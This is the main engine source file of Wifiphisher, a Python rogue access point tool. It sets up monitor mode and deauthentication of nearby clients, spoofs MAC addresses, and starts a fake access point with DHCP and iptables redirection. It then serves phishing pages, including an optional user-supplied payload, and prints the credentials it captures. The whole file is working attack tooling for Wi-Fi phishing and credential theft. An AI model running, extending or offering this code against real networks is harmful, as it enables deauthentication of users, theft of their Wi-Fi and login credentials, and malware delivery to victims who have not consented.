#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: skip-file
from __future__ import (absolute_import, division, print_function,
                        unicode_literals)
import subprocess
import os
import logging
import logging.config
import time
import sys
import argparse
import curses
import signal
from threading import Thread
from shutil import copyfile
from .common.constants import (
    COLOR_WHITE, COLOR_GREEN, COLOR_RED, COLOR_TAN, COLOR_ORANGE,
    INTERFERING_PROCS, CHANNEL, PHISHING_PAGES_DIR, LURE10_EXTENSION,
    HANDSHAKE_VALIDATE_EXTENSION, WPSPBC, KNOWN_BEACONS_EXTENSION,
    ROGUEHOSTAPDINFO, PORT, SSL_PORT, LOGGING_CONFIG, LOG_FILEPATH,
    MAC_PREFIX_FILE, DEAUTH_EXTENSION, DEVELOPMENT_VERSION, DEV_NULL, WEBSITE,
    NEW_YEAR, BIRTHDAY, DEFAULT_EXTENSIONS, NETWORK_GW_IP)
import wifiphisher.common.extensions as extensions
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.tui as tui
import wifiphisher.common.opmode as opmode

logger = logging.getLogger(__name__)

# Fixes UnicodeDecodeError for ESSIDs
reload(sys)
sys.setdefaultencoding('utf8')


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-eI",
        "--extensionsinterface",
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " + "Example: -eI wlan1"))
    parser.add_argument(
        "-aI",
        "--apinterface",
        type=opmode.validate_ap_interface,
        help=("Manually choose an interface that supports AP mode for  " +
              "spawning an AP. " + "Example: -aI wlan0"))
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" +
              "Example: -iI ppp0"))
    parser.add_argument(
        "-nE",
        "--noextensions",
        help=("Do not load any extensions."),
        action='store_true')
    parser.add_argument(
        "-nD",
        "--nodeauth",
        help=("Skip the deauthentication phase."),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"))
    # TODO: Would be cool to optionally provide ESSID (i.e. -dE "foo")
    parser.add_argument(
        "-dE",
        "--deauth-essid",
        help=("Deauth all the BSSIDs having same ESSID from AP selection or " +
              "the ESSID given by -e option"),
        action='store_true')
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-hC",
        "--handshake-capture",
        help=("Capture of the WPA/WPA2 handshakes for verifying passphrase" +
              "Example : -hC capture.pcap"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')
    parser.add_argument(
        "-lC",
        "--lure10-capture",
        help=("Capture the BSSIDs of the APs that are discovered during "
              "AP selection phase. This option is part of Lure10 attack."),
        action='store_true')
    parser.add_argument(
        "-lE",
        "--lure10-exploit",
        help=("Fool the Windows Location Service of nearby Windows users "
              "to believe it is within an area that was previously captured "
              "with --lure10-capture. Part of the Lure10 attack."))
    parser.add_argument(
        "-iAM",
        "--mac-ap-interface",
        help=("Specify the MAC address of the AP interface"))
    parser.add_argument(
        "-iEM",
        "--mac-extensions-interface",
        help=("Specify the MAC address of the extensions interface"))
    parser.add_argument(
        "-iNM",
        "--no-mac-randomization",
        help=("Do not change any MAC address"),
        action='store_true')
    parser.add_argument(
        "--logging", help=("Log activity to file"), action="store_true")
    parser.add_argument(
        "--payload-path",
        help=("Payload path for scenarios serving a payload"))
    parser.add_argument(
        "-cM",
        "--channel-monitor",
        help="Monitor if target access point changes the channel.",
        action="store_true")
    parser.add_argument(
        "-wP",
        "--wps-pbc",
        help="Monitor if the button on a WPS-PBC Registrar is pressed.",
        action="store_true")
    parser.add_argument(
        "-wAI",
        "--wpspbc-assoc-interface",
        help="The WLAN interface used for associating to the WPS AccessPoint.",
    )
    parser.add_argument(
        "-kB",
        "--known-beacons",
        help="Broadcast a number of beacon frames advertising popular WLANs",
        action='store_true')
    parser.add_argument(
        "-fH",
        "--force-hostapd",
        help="Force the usage of hostapd installed in the system",
        action='store_true')

    return parser.parse_args()


VERSION = "1.4GIT"
args = parse_args()
APs = {}  # for listing APs


def setup_logging(args):
    """
    Setup the logging configurations
    """
    root_logger = logging.getLogger()
    # logging setup
    if args.logging:
        logging.config.dictConfig(LOGGING_CONFIG)
        should_roll_over = False
        # use root logger to rotate the log file
        if os.path.getsize(LOG_FILEPATH) > 0:
            should_roll_over = os.path.isfile(LOG_FILEPATH)
        should_roll_over and root_logger.handlers[0].doRollover()
        logger.info("Starting Wifiphisher")


def set_ip_fwd():
    """
    Set kernel variables.
    """
    subprocess.Popen(
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        stdout=DEV_NULL,
        stderr=subprocess.PIPE)


def set_route_localnet():
    """
    Set kernel variables.
    """
    subprocess.Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DEV_NULL,
        stderr=subprocess.PIPE)


def kill_interfering_procs():
    """
    Kill the interfering processes that may interfere the wireless card
    :return None
    :rtype None
    ..note: The interfering processes are referenced by airmon-zc.
    """

    # stop the NetworkManager related services
    # incase service is not installed catch OSError
    try:
        subprocess.Popen(
            ['service', 'network-manager', 'stop'],
            stdout=subprocess.PIPE,
            stderr=DEV_NULL)
        subprocess.Popen(
            ['service', 'NetworkManager', 'stop'],
            stdout=subprocess.PIPE,
            stderr=DEV_NULL)
        subprocess.Popen(
            ['service', 'avahi-daemon', 'stop'],
            stdout=subprocess.PIPE,
            stderr=DEV_NULL)
    except OSError:
        pass

    # Kill any possible programs that may interfere with the wireless card
    proc = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    # total processes in the system
    sys_procs = output.splitlines()
    # loop each interfering processes and find if it is running
    for interfering_proc in INTERFERING_PROCS:
        for proc in sys_procs:
            # kill all the processes name equal to interfering_proc
            if interfering_proc in proc:
                pid = int(proc.split(None, 1)[0])
                print("[{}+{}] Sending SIGKILL to {}".format(
                    COLOR_GREEN, COLOR_WHITE, interfering_proc))
                os.kill(pid, signal.SIGKILL)


class WifiphisherEngine:
    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()
        self.em = extensions.ExtensionManager(self.network_manager)
        self.opmode = opmode.OpMode()

    def stop(self):
        if DEVELOPMENT_VERSION:
            print("[{}+{}] Show your support!".format(COLOR_GREEN,
                                                      COLOR_WHITE))
            print("[{}+{}] Follow us: https://twitter.com/wifiphisher".format(
                COLOR_GREEN, COLOR_WHITE))
            print(
                "[{}+{}] Like us: https://www.facebook.com/Wifiphisher".format(
                    COLOR_GREEN, COLOR_WHITE))
        print("[{}+{}] Captured credentials:".format(COLOR_GREEN, COLOR_WHITE))
        for cred in phishinghttp.creds:
            logger.info("Creds: %s", cred)
            print(cred)

        # EM depends on Network Manager.
        # It has to shutdown first.
        self.em.on_exit()
        # move the access_points.on_exit before the exit for
        # network manager
        self.access_point.on_exit()
        self.network_manager.on_exit()
        self.template_manager.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')

        print("[{}!{}] Colosing".format(COLOR_RED, COLOR_WHITE))
        sys.exit(0)

    def try_change_mac(self, iface_name, mac_address=None):
        """
        :param self: A WifiphisherEngine object
        :param iface_name: Name of an interface
        :param mac_addr: A MAC address
        :type self: WifiphisherEngine
        :type iface_name: str
        :type mac_address:str
        :return: None
        :rtype: None
        """
        try:
            if mac_address is not None:
                self.network_manager.set_interface_mac(iface_name, mac_address)
            else:
                self.network_manager.set_interface_mac_random(iface_name)
        except interfaces.InvalidMacAddressError as err:
            print("[{0}!{1}] {2}".format(COLOR_RED, COLOR_WHITE, err))

    def start(self):

        # First of - are you root?
        if os.geteuid():
            logger.error("Non root user detected")
            sys.exit('[' + COLOR_RED + '-' + COLOR_WHITE +
                     '] Please run as root')

        # Parse args
        global args, APs
        args = parse_args()

        # setup the logging configuration
        setup_logging(args)

        # Initialize the operation mode manager
        self.opmode.initialize(args)
        # Set operation mode
        self.opmode.set_opmode(args, self.network_manager)

        self.network_manager.start()

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if self.opmode.internet_sharing_enabled():
                self.network_manager.internet_access_enable = True
                if self.network_manager.is_interface_valid(
                        args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    if interfaces.is_wireless_interface(internet_interface):
                        self.network_manager.unblock_interface(
                            internet_interface)
                logger.info("Selecting %s interface for accessing internet",
                            args.internetinterface)
            # check if the interface for WPS is valid
            if self.opmode.assoc_enabled():
                if self.network_manager.is_interface_valid(
                        args.wpspbc_assoc_interface, "WPS"):
                    logger.info("Selecting %s interface for WPS association",
                                args.wpspbc_assoc_interface)
            if self.opmode.extensions_enabled():
                if args.extensionsinterface and args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.extensionsinterface, "monitor"):
                        mon_iface = args.extensionsinterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically(
                    )
                # display selected interfaces to the user
                logger.info(
                    "Selecting {} for deauthentication and {} for the rogue Access Point"
                    .format(mon_iface, ap_iface))
                print(
                    "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                    "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                    "rogue Access Point".format(COLOR_GREEN, COLOR_WHITE,
                                                mon_iface, ap_iface))

                # randomize the mac addresses
                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.try_change_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.try_change_mac(ap_iface)
                    if args.mac_extensions_interface:
                        self.try_change_mac(mon_iface,
                                            args.mac_extensions_interface)
                    else:
                        self.try_change_mac(mon_iface)
            if not self.opmode.extensions_enabled():
                if args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.try_change_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.try_change_mac(ap_iface)

                print(
                    "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                    "rogue Access Point".format(COLOR_GREEN, COLOR_WHITE,
                                                ap_iface))
                logger.info("Selecting {} interface for rouge access point"
                            .format(ap_iface))

            # make sure interfaces are not blocked
            logger.info("Unblocking interfaces")
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            # set monitor mode only when --essid is not given
            if self.opmode.extensions_enabled() or args.essid is None:
                self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError,
                interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            logging.exception("The following error has occurred:")
            print("[{0}!{1}] {2}".format(COLOR_RED, COLOR_WHITE, err))

            time.sleep(1)
            self.stop()

        if not args.internetinterface:
            kill_interfering_procs()
            logger.info("Killing all interfering processes")

        rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)
        if not args.no_mac_randomization:
            logger.info("Changing {} MAC address to {}".format(
                ap_iface, rogue_ap_mac))
            print("[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(
                COLOR_GREEN, COLOR_WHITE, ap_iface, rogue_ap_mac))

            if self.opmode.extensions_enabled():
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                logger.info("Changing {} MAC address to {}".format(
                    mon_iface, mon_mac))
                print("[{0}+{1}] Changing {2} MAC addr to {3}".format(
                    COLOR_GREEN, COLOR_WHITE, mon_iface, mon_mac))

        if self.opmode.internet_sharing_enabled():
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        print("[{}*{}] Cleared leases, started DHCP, set up iptables".format(
            COLOR_TAN, COLOR_WHITE))
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            # We don't have target attacking MAC in frenzy mode
            # That is we deauth all the BSSIDs that being sniffed
            target_ap_mac = None
            enctype = None
        else:
            # let user choose access point
            # start the monitor adapter
            self.network_manager.up_interface(mon_iface)
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher,
                                           self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info,
                                          ap_info_object)
            # if the user has chosen a access point continue
            # otherwise shutdown
            if access_point:
                # store choosen access point's information
                essid = access_point.name
                channel = access_point.channel
                target_ap_mac = access_point.mac_address
                enctype = access_point.encryption
            else:
                self.stop()
        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario,
                                                self.template_manager)
        logger.info("Selecting {} template".format(
            template.get_display_name()))
        print("[{}+{}] Selecting {} template".format(
            COLOR_GREEN, COLOR_WHITE, template.get_display_name()))

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = args.payload_path
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input(
                    "[" + COLOR_GREEN + "+" + COLOR_WHITE + "] Enter the [" +
                    COLOR_GREEN + "full path" + COLOR_WHITE +
                    "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print("[{}-{}] Invalid file path!".format(
                        COLOR_RED, COLOR_WHITE))
            print("[{}*{}] Using {}{}{1} as payload".format(
                COLOR_TAN, COLOR_WHITE, COLOR_GREEN, payload_path))
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path,
                     PHISHING_PAGES_DIR + template.get_payload_path())

        ap_context = []
        for i in APs:
            ap_context.append({
                'channel':
                APs[i][0] or "",
                'essid':
                APs[i][1] or "",
                'bssid':
                APs[i][2] or "",
                'vendor':
                self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': ap_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if target_ap_mac is not None:
            ap_logo_path = template.use_file(
                self.mac_matcher.get_vendor_logo_path(target_ap_mac))

        template.merge_context({
            'target_ap_channel':
            channel or "",
            'target_ap_essid':
            essid or "",
            'target_ap_bssid':
            target_ap_mac or "",
            'target_ap_encryption':
            enctype or "",
            'target_ap_vendor':
            self.mac_matcher.get_vendor_name(target_ap_mac) or "",
            'target_ap_logo_path':
            ap_logo_path or ""
        })
        # add wps_enable into the template context
        if args.wps_pbc:
            template.merge_context({'wps_pbc_attack': "1"})
        else:
            template.merge_context({'wps_pbc_attack': "0"})

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --noextensions is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.network_manager.up_interface(ap_iface)
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.force_hostapd:
            print("[{}*{}] Using hostapd instead of roguehostapd."
                  " Many significant features will be turned off.".format(
                      COLOR_TAN, COLOR_WHITE))
            self.access_point.enable_system_hostapd()
        if args.wpspbc_assoc_interface:
            wps_mac = self.network_manager.get_interface_mac(
                args.wpspbc_assoc_interface)
            self.access_point.add_deny_macs([wps_mac])
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if self.opmode.internet_sharing_enabled():
            self.access_point.set_internet_interface(args.internetinterface)
        print("[{}*{}] Starting the fake access point.".format(
            COLOR_TAN, COLOR_WHITE))
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except BaseException:
            self.stop()
        # Start Extension Manager (EM)
        # We need to start EM before we boot the web server
        if self.opmode.extensions_enabled():
            shared_data = {
                'is_freq_hop_allowed': self.opmode.freq_hopping_enabled(),
                'target_ap_channel': channel or "",
                'target_ap_essid': essid or "",
                'target_ap_bssid': target_ap_mac or "",
                'target_ap_encryption': enctype or "",
                'target_ap_logo_path': ap_logo_path or "",
                'rogue_ap_mac': rogue_ap_mac,
                'roguehostapd': self.access_point.hostapd_object,
                'APs': ap_context,
                'args': args
            }

            self.network_manager.up_interface(mon_iface)
            self.em.set_interface(mon_iface)
            extensions = DEFAULT_EXTENSIONS
            if args.lure10_exploit:
                extensions.append(LURE10_EXTENSION)
            if args.handshake_capture:
                extensions.append(HANDSHAKE_VALIDATE_EXTENSION)
            if args.nodeauth:
                extensions.remove(DEAUTH_EXTENSION)
            if args.wps_pbc:
                extensions.append(WPSPBC)
            if args.known_beacons:
                extensions.append(KNOWN_BEACONS_EXTENSION)
            if not args.force_hostapd:
                extensions.append(ROGUEHOSTAPDINFO)
            self.em.set_extensions(extensions)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()
        # With configured DHCP, we may now start the web server
        if not self.opmode.internet_sharing_enabled():
            # Start HTTP server in a background thread
            print("[{}*{}] Starting HTTP/HTTPS server at ports {}, {}".format(
                COLOR_TAN, COLOR_WHITE, PORT, SSL_PORT))
            webserver = Thread(
                target=phishinghttp.run_http_server,
                args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        APs = []

        # Main loop.
        try:
            main_info = tui.MainInfo(VERSION, essid, channel, ap_iface,
                                     self.em, phishinghttp, args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        today = time.strftime("%Y-%m-%d %H:%M")
        print("[{}*{}] Starting Wifiphisher {} ({}) at {}".format(
            COLOR_TAN, COLOR_WHITE, VERSION, WEBSITE, today))
        if BIRTHDAY in today:
            print(
                "[{}*{}] Wifiphisher was first released on this day in 2015! Happy birthday!".
                format(COLOR_TAN, COLOR_WHITE))
        if NEW_YEAR in today:
            print("[{}*{}] Happy new year!".format(COLOR_TAN, COLOR_WHITE))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print("{}\n (^C){} interrupted{}\n".format(COLOR_RED, COLOR_ORANGE,
                                                   COLOR_WHITE))
    except EOFError:
        print("{}\n (^D){} interrupted{}\n".format(COLOR_RED, COLOR_ORANGE,
                                                   COLOR_WHITE))
